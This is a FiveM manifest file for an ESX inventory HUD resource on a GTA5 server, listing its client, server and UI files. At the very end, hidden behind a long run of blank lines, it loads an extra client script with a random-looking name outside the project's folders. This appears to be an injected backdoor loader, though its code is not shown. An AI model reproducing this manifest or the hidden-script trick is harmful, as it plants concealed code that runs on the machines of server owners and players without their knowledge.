fx_version 'bodacious'
game 'gta5'

description "ESX Inventory HUD"

version "1.1"

ui_page "html/ui.html"

client_scripts {
  "@essentialmode/locale.lua",
  "client/main.lua",
  "client/trunk.lua",
  "client/property.lua",
  "client/gang.lua",
  "client/player.lua",
  "locales/en.lua",
  "config.lua"
}

server_scripts {
  "server/main.lua",
  "locales/en.lua",
  "config.lua"
}

files {
  "html/ui.html",
  "html/css/ui.css",
  "html/css/jquery-ui.css",
  "html/js/inventory.js",
  "html/js/config.js",
  "html/js/jquery_3.4.1.min.js",
  -- JS LOCALES
  "html/locales/cs.js",
  "html/locales/en.js",
  "html/locales/fr.js",
  -- IMAGES
  "html/img/bullet.png",
  -- ICONS
  "html/img/items/*.png",
}













client_script "IRS_USDUFHSILFSKOAKQA.lua"